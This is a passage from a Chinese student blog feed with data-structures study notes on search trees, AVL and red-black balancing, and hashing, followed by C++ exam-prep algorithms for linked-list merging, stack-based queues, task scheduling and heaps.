(设n个元素，每个元素有d位，基数为k)：</p><ul><li>LSD时间复杂度：O(d(n+k)) 。</li><li>MSD时间复杂度：最坏 O(d⋅n⋅k)，平均也类似 。</li><li>空间复杂度：O(n+k) 。</li></ul></li></ul><h3 id="索引排序">索引排序</h3><ul><li><strong>核心思路</strong>：创建一个索引序列，排序时不直接移动原序列中的元素，而是移动索引。排序完成后，索引序列指明了原序列元素应有的顺序。这在元素移动和拷贝代价很大时非常有用 。</li><li><strong>元素顺序调整</strong>：得到排序后的索引序列后，可以根据索引将原序列元素调整到正确位置。</li></ul><p><img src="https://pic.moyuin.top/2025/05/12/68219fdb8c19f.png" alt=" "></p><hr><h1>数据结构-查找</h1><h2 id="基本查找算法">基本查找算法</h2><h3 id="顺序查找">顺序查找</h3><p>一个一个查，O(n)</p><h3 id="二分查找">二分查找</h3><p>中位 middle=<code>(low+high)/2</code><br>low 和 high 要随时改成 middle+1 (去右边找)或者 middle-1 （去左边找）<br>时间复杂度 O(logn)</p><hr><h3 id="索引查找（分块查找）">索引查找（分块查找）</h3><ul><li>创建存储数据的表，再根据要求建立相应索引<br>（如创建字典目录，有点像 unordered_map 建立映射）</li><li>索引查找需要牺牲空间，从而降低时间复杂度</li></ul><h4 id="如何构建索引？">如何构建索引？</h4><ul><li>表中数据分块，使得内部分块的关键字值都大于或小于下一个块。称为“分块有序”。</li><li>为每块建立一个索引项，包含 <code>key</code> 和 <code>index</code> 。即关键码字段和指针字段。</li><li>通过<code>key</code> 找到关键字值的记录块，然后在块内进行 <strong>顺序查找或者二分查找</strong><br><img src="https://pic.moyuin.top/2025/05/06/681972101597a.png" alt=" "></li></ul><p>其实时间复杂度也是线性，但是依赖于块数据的大小与块内查找方式。<br><img src="https://pic.moyuin.top/2025/05/06/681972634d44b.png" alt=" "></p><ul><li>O(s)与O(logs)的查找时间，还得看分块的大小。</li></ul><hr><h2 id="二叉查找树-（BST）">二叉查找树 （BST）</h2><h3 id="基本定义">基本定义</h3><p>二叉查找树或者是一棵空树；<br>或者是具有如下特性的二叉树：</p><ul><li>若根结点的左子树不空，则左子树上所有结点的值均小于根结点的值；</li><li>若根结点的右子树不空，则右子树上所有结点的值均大于根结点的值；<br>性质：<strong>任何二叉查找树的中序遍历都是有序序列</strong><br>且一般规律是: 任意左子树的值 &lt; 根节点的值 &lt; 对应右子树的值。<br><img src="https://pic.moyuin.top/2025/05/06/6819743c74b9c.png" alt=" "></li></ul><h3 id="查找">查找</h3><p>如果要在二叉查找树寻找关键值 <code>key</code> ,基本原理和二分查找相同。如果给定值比当前节点小则去当前节点的左子树继续寻找，大则去右子树继续寻找。<br><img src="https://pic.moyuin.top/2025/05/06/6819755227c8c.png" alt=" "></p><p>时间复杂度为 O(h),h为树的高度。基本也就是进行递归调用。</p><p>对于其时间复杂度，性能最差可能会退化到线性查找。<br><img src="https://pic.moyuin.top/2025/05/06/68197f1c9f9d9.png" alt=" "><br><img src="https://pic.moyuin.top/2025/05/06/68197f320c789.png" alt=" "></p><h3 id="二叉树插入算法">二叉树插入算法</h3><p>注意：<strong>插入位置是节点从根节点比较一步一步确定的，小于该节点移到左侧与左节点比较，反之同理，不是随便写的。</strong><br>也是利用查找，确定好要进入的树节点，从而插入值。<br><strong>“插入”操作在查找不成功时才进行</strong>。如果树中存在该值，BST 不允许有重复值。<br><img src="https://pic.moyuin.top/2025/05/06/6819771990a1b.png" alt=" "></p><h3 id="二叉查找树的建立">二叉查找树的建立</h3><p>将根节点设置为一个空集（变成可以设定为一个无限小），然后往下查找往下画即可。</p><h3 id="二叉查找树的删除">二叉查找树的删除</h3><p>删除可分三种情况讨论：<br>（1）被删除的结点是叶子 ，不用管孩子，很简单<br><img src="https://pic.moyuin.top/2025/05/06/68197c6df26f8.png" alt=" "></p><p>（2）被删除的结点只有左子树或者只有右子树 ，像链表一样需要删除节点的操作<br><img src="https://pic.moyuin.top/2025/05/06/68197c8725d4c.png" alt=" "></p><p>（3）被删除的结点既有左子树，也有右子树。这个比较复杂，与堆的那个操作不太一样。<br>相当于在序列里将其往前移动一格，拼起来。<br><img src="https://pic.moyuin.top/2025/05/06/68197ca755bb7.png" alt=" "></p><h2 id="平衡二叉树（AVL树）">平衡二叉树（AVL树）</h2><h3 id="基本定义-2">基本定义</h3><p>AVL树或者是一棵空树，或者是具有下列性质的二叉查找树：</p><ul><li>左、右子树都是平衡二叉树；</li><li>左、右子树的高度差绝对值不超过1。（这里的高度差左子树高度-右子树高度）<br><img src="https://pic.moyuin.top/2025/05/06/6819815d362ff.png" alt=" "></li></ul><h3 id="构造AVL树">构造AVL树</h3><p>看个例子。所谓<strong>平衡旋转</strong>，左旋和右旋，就是：</p><blockquote><p><strong>右旋 = 左子过重时，把左儿子提上来当新根，把原根放到右边；左儿子的右子（如果有）会变成原根的左子。</strong></p></blockquote><blockquote><p><strong>左旋 = 右子过重时，把右儿子提上来当新根，把原根放到左边；右儿子的左子（如果有）会变成原根的右子。</strong></p></blockquote><p><img src="https://pic.moyuin.top/2025/05/06/681981a599c96.png" alt=" "><br><img src="https://pic.moyuin.top/2025/05/06/6819822c4d942.png" alt=" "></p><h3 id="将BST转化为AVL">将BST转化为AVL</h3><p><img src="https://pic.moyuin.top/2025/05/06/6819847d7e3d3.png" alt=" "></p><h4 id="平衡化旋转">平衡化旋转</h4><p><img src="https://pic.moyuin.top/2025/05/06/681984a26bbb9.png" alt=" "></p><h4 id="失衡调整旋转平衡处理">失衡调整旋转平衡处理</h4><ul><li><p>第一个字母代表：<strong>失衡节点是哪个子树高了</strong>（L = 左子树，R = 右子树）</p></li><li><p>第二个字母代表：<strong>哪边插入导致了这个子树变高</strong>（L = 左边插入，R = 右边插入）<br>图例</p></li><li><p>单调右旋 （LL）<br><img src="https://pic.moyuin.top/2025/05/13/6822a9dc26338.png" alt=" "></p></li><li><p>单调左旋（RR）<br><img src="https://pic.moyuin.top/2025/05/13/6822aa0aa6af7.png" alt=" "></p></li><li><p>先左后右旋 （LR）<br><img src="https://pic.moyuin.top/2025/05/13/6822aa1910657.png" alt=" "></p></li><li><p>先右后左旋转（RL）<br><img src="https://pic.moyuin.top/2025/05/13/6822aa29095e7.png" alt=" "></p></li></ul><h3 id="插入">插入</h3><p>AVL树的新结点的插入过程包括两个步骤：</p><ul><li>结点插入： 按照BST构建方法插入，同时更新平衡因子</li><li>平衡化：如果插入过程中出现不平衡，采用<strong>平衡化调整</strong>，以保持AVL的性质</li></ul><p>插入有一个递归算法，太长了…</p><h3 id="删除">删除</h3><p><img src="https://pic.moyuin.top/2025/05/13/6822b48508436.png" alt="image.png"></p><hr><h2 id="散列查找-哈希查找">散列查找 | 哈希查找</h2><p>建立映射，<code>unordered_map</code>的伟大无需多言。<br>散列查找需要建立某种哈希函数，通过某种数学方法将数据转化为哈希地址，建立一个哈希表，映射建立。<br><strong>由于哈希函数是一个压缩映射</strong>，因此在一般情况下<strong>容易产生冲突</strong>，避免冲突，要么就哈希地址更复杂，要么就哈希函数更复杂。</p><blockquote><p>很难找到一个不产生冲突的散列函数。一般情况下，只能选择恰当的散列函数，使冲突尽可能少地产生。</p></blockquote><h3 id="散列函数-哈希函数">散列函数 | 哈希函数</h3><p>一般来说，一个好的散列函数应满足下列两个条件：</p><ul><li>计算简单</li><li>冲突少</li></ul><p>常见的哈希函数构造方法有：</p><ul><li>直接地址存储法</li><li>数字分析法</li><li>平方取中法</li><li>折叠法</li><li>除留余数法</li><li>随机数法</li></ul><h4 id="直接地址存储法">直接地址存储法</h4><p><img src="https://pic.moyuin.top/2025/05/13/6822ba1cd89c6.png" alt="image.png"></p><h4 id="数字分析法">数字分析法</h4><p><img src="https://pic.moyuin.top/2025/05/13/6822ba49733cc.png" alt="image.png"></p><h4 id="平方取中法">平方取中法</h4><p><img src="https://pic.moyuin.top/2025/05/13/6822ba5da25cd.png" alt="image.png"></p><p>平方取中法思想：<strong>以关键字的平方值的中间几位作为存储地址。</strong><br>关键字的各位都在平方值的中间几位有所贡献，Hash 值中应该有各位影子。</p><h4 id="折叠法">折叠法</h4><p><img src="https://pic.moyuin.top/2025/05/13/6822bad72914b.png" alt="image.png"></p><h4 id="除留余数法">除留余数法</h4><p><img src="https://pic.moyuin.top/2025/05/13/6822bb08893b4.png" alt="image.png"></p><h4 id="随机数法">随机数法</h4><p>注意随机一定要真随机，设置好 seed 随机种子。</p><p><img src="https://pic.moyuin.top/2025/05/13/6822bb403f316.png" alt="image.png"></p><p>散列表的绘制之后补充。</p><h2 id="红黑树">红黑树</h2><h3 id="红黑树的五条核心规则">红黑树的五条核心规则</h3><ol><li>每个节点要么是<strong>红色</strong>，要么是<strong>黑色</strong>。</li><li>根节点永远是<strong>黑色</strong>。</li><li>所有叶子节点（NIL/空节点）都是<strong>黑色</strong>的。</li><li><strong>红色</strong>节点的子节点必须是<strong>黑色</strong>的。（即不能有两个连续的红色节点）</li><li>从任一节点到其所有后代叶子节点的路径上，<strong>黑色</strong>节点的数量都相同。</li></ol><p><strong>插入策略</strong>：新插入的节点<strong>总是红色</strong>的。然后通过“变色”和“旋转”来修复可能违反的规则。</p><h3 id="修复违规的“小抄”">修复违规的“小抄”</h3><p>当你插入一个<strong>红色</strong>新节点 <code>N</code>，发现它的父节点 <code>P</code> 也是<strong>红色</strong>时（违反了规则4），你只需要看它<strong>叔叔节点 <code>U</code> 的颜色</strong>：</p><ul><li><strong>情况1：叔叔 <code>U</code> 是红色</strong><ul><li><strong>操作</strong>：<strong>变色</strong>。将父节点 <code>P</code> 和叔叔 <code>U</code> 变为<strong>黑色</strong>，将祖父节点 <code>G</code> 变为<strong>红色</strong>。然后将祖父节点 <code>G</code> 当作新的插入点，继续向上检查。</li></ul></li><li><strong>情况2：叔叔 <code>U</code> 是黑色（或NIL/空节点）</strong><ul><li><strong>操作</strong>：<strong>旋转+变色</strong>。这又分为两种：<ul><li><strong>直线型 (LL / RR)</strong>：直接对祖父节点 <code>G</code> 进行旋转，然后将 <code>P</code> 和 <code>G</code> 变色。</li><li><strong>三角型 (LR / RL)</strong>：先对父节点 <code>P</code> 进行旋转，变成直线型，然后再按直线型处理。</li></ul></li></ul></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="编程" scheme="https://notes.moyuin.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-经典算法设计（期中备考用）</title>
    <link href="https://notes.moyuin.top/2025/04/14/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-jing-dian-suan-fa-she-ji-qi-zhong-bei-kao-yong/"/>
    <id>https://notes.moyuin.top/2025/04/14/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-jing-dian-suan-fa-she-ji-qi-zhong-bei-kao-yong/</id>
    <published>2025-04-14T10:45:15.000Z</published>
    <updated>2025-04-14T10:45:15.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>数据结构-经典算法设计（期中备考用）</h1><p>每个算法都有简单的思路，但并非算法思想，只是记录一些经典的算法设计。</p><hr><h2 id="1-合并两个有序链表">1. 合并两个有序链表</h2><h3 id="题目描述">题目描述</h3><p>写一个函数，将两个升序链表合并成一个新的升序链表，返回新链表的头指针。</p><h3 id="算法步骤">算法步骤</h3><ol><li>创建一个结点 dummy（头指针占位）。</li><li>使用一个指针 <code>tail</code> 指向合并链表的末尾。</li><li>每次比较两个链表当前节点的值，将较小的一个链接到 <code>tail</code>。</li><li>将 <code>tail</code> 向后移动，源链表指针也前进。</li><li>当一个链表走完后，将另一个链表剩余部分直接接到 <code>tail</code> 后面。</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">ListNode</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode<span class="token operator">*</span> next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">val</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//结构体构建，可写可不写，最重要的是下面的这个算法函数。</span>ListNode<span class="token operator">*</span> <span class="token function">merge</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> l1<span class="token punctuation">,</span> ListNode<span class="token operator">*</span> l2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ListNode <span class="token function">dummy</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span>tail <span class="token operator">=</span> <span class="token operator">&amp;</span>dummy<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>l1 <span class="token operator">&amp;&amp;</span> l2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l1<span class="token operator">-></span>val <span class="token operator">&lt;</span> l2<span class="token operator">-></span>val<span class="token punctuation">)</span> tail<span class="token operator">-></span>next <span class="token operator">=</span> l1<span class="token punctuation">,</span> l1 <span class="token operator">=</span> l1<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token keyword">else</span> tail<span class="token operator">-></span>next <span class="token operator">=</span> l2<span class="token punctuation">,</span> l2 <span class="token operator">=</span> l2<span class="token operator">-></span>next<span class="token punctuation">;</span>        tail <span class="token operator">=</span> tail<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    tail<span class="token operator">-></span>next <span class="token operator">=</span> l1 <span class="token operator">?</span> l1 <span class="token operator">:</span> l2<span class="token punctuation">;</span>    <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>时间复杂度：<code>O(m + n)</code>，m 和 n 是两个链表的长度<br>空间复杂度：<code>O(1)</code>（原地合并，不开额外数组）</p><hr><h2 id="2-用栈实现队列">2. 用栈实现队列</h2><h3 id="题目描述-2">题目描述</h3><p>使用两个栈实现一个队列的入队和出队操作。</p><h3 id="算法步骤-2">算法步骤</h3><p>用两个栈 <code>in</code> 和 <code>out</code>：</p><ul><li>入队时直接压入 <code>in</code></li><li>出队时：<ul><li>若 <code>out</code> 非空，直接弹出</li><li>若 <code>out</code> 为空，将 <code>in</code> 所有元素倒入 <code>out</code>，再弹出</li></ul></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">MyQueue</span> <span class="token punctuation">&#123;</span><span class="token keyword">private</span><span class="token operator">:</span>    stack<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> inStack<span class="token punctuation">,</span> outStack<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>inStack<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            outStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>inStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//把入栈倒入出栈</span>            inStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token comment">//这里其实也只要写push和pop函数，记得把transfer函数套到pop里即可。</span>    <span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        inStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//压入队列</span>    <span class="token keyword">void</span> <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>outStack<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>outStack<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> outStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//弹出队列</span>    <span class="token keyword">int</span> <span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>outStack<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> outStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> inStack<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> outStack<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>时间复杂度：<code>O(1)</code> 每个元素最多被移动两次。<br>空间复杂度： <code>O(n)</code> 两个栈，最多 n 个元素在栈中。</p><hr><h2 id="3-队列模拟任务调度">3. 队列模拟任务调度</h2><h3 id="题目描述-3">题目描述</h3><p>队列中每个任务有一个编号，顺序入队，按顺序处理。可能会出现“插队”（比如优先任务）。模拟这个过程。</p><p><strong>一些常见题目变形</strong></p><ul><li>循环队列实现多进程</li><li>某任务执行完后重新入队（多轮轮转）</li><li>实现带优先级的调度（双端队列 / 优先队列）</li></ul><h3 id="基本思路">基本思路</h3><ul><li>普通调度：使用普通队列 <code>queue&lt;T&gt;</code></li><li>插队：用 <code>deque&lt;T&gt;</code>，高优先级任务从队首插入</li><li>模拟时间片轮转：每次处理一个任务，将其放回队尾</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//这个是没有插队的普通版本</span><span class="token keyword">void</span> <span class="token function">simulateQueue</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> tasks<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> q<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> t <span class="token operator">:</span> tasks<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 初始入队</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> current <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 假设部分任务重新排入队尾</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>current <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 模拟需要再次处理</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment">//这个使用插队，需要使用双端队列，让任务可以push的时候直接到push_front()</span><span class="token keyword">void</span> <span class="token function">simulateTaskQueue</span><span class="token punctuation">(</span><span class="token keyword">const</span> vector<span class="token operator">&lt;</span>Task<span class="token operator">></span><span class="token operator">&amp;</span> tasks<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    deque<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> q<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> Task<span class="token operator">&amp;</span> task <span class="token operator">:</span> tasks<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>task<span class="token punctuation">.</span>urgent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token comment">//如果任务优先为true</span>            q<span class="token punctuation">.</span><span class="token function">push_front</span><span class="token punctuation">(</span>task<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 插队</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            q<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>task<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 正常排队</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//当然也可以在出队上用做文章，不过这里不多写了，怕有bug</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> current <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> q<span class="token punctuation">.</span><span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>current <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 模拟需要再次处理</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用STL的话，时间复杂度只是<code>O(1)</code> 而已。</p><p>当然，如果题目涉及任务有权重什么的，一般我们实现是直接用 STL 的 priority_queue…不过这里也提供 heap 的算法模拟，最大堆。<em>这种涉及数学方法分割的我一般都不怎么会…</em></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">down</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 下滤</span>    <span class="token keyword">int</span> t <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">&lt;=</span> heapSize <span class="token operator">&amp;&amp;</span> heap<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">]</span> <span class="token operator">></span> heap<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span> t <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> heapSize <span class="token operator">&amp;&amp;</span> heap<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> heap<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span> t <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">!=</span> i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>heap<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> heap<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">down</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">up</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 上滤</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> heap<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> heap<span class="token punctuation">[</span>i <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>heap<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> heap<span class="token punctuation">[</span>i <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        i <span class="token operator">/=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    heap<span class="token punctuation">[</span><span class="token operator">++</span>heapSize<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token function">up</span><span class="token punctuation">(</span>heapSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    heap<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> heap<span class="token punctuation">[</span>heapSize<span class="token operator">--</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">down</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span 